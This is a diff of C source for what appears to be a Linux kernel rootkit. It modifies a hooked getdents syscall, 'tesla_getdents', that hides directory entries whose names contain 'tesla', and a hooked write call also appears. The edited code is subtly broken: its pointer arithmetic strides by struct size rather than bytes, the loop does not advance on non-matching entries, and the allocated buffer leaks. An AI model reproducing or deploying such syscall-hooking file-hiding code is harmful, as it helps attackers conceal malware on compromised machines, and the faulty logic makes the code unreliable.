@@ -44,19 +44,20 @@ asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
 	int ret = orig_dents(fd, dirp, count);
-    char *p1 = kmalloc(ret, GFP_KERNEL);
-	char *p2 = 0;
-	int i = 0;
+    struct linux_dirent *p1 = kmalloc(ret, GFP_KERNEL);
+	struct linux_dirent *p2 = 0;
+	
 	if (copy_from_user(p1, dirp, count) != 0) {
 		return -EACCES;
 	}
 	p2 = p1;
+	int i = 0;
 	while (i < ret) {
 		if (strstr(p2->d_name,"tesla")) {
 			memmove(p1, p2, p2->d_reclen);
 			ret -= p2->d_reclen;
 			i += p2->d_reclen;
-			p2 = (struct linux_dirent*)((char *)p2 + p2->d_reclen);
+			p2 = p2 + p2->d_reclen;
 		}
 	}
 	
